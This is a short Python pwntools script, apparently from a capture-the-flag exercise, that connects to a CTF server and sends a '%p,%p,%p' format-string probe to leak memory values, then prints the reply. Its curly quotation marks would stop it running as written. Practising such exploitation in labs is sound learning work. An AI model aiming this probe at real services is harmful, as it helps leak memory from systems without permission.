from pwn import *
context.log_level='critical'

s=remote('file.ctf.org', 1337) #process(‘./caf’)

print(s.recvregex(b’:’)) # read until we get the input prompt
s.sendline(b’%p,%p,%p’)
response=s.recvline() #s.recv()
print(response)
s.recvuntil(b’foo’) #ensures we don’t kill the process just yet
s.close()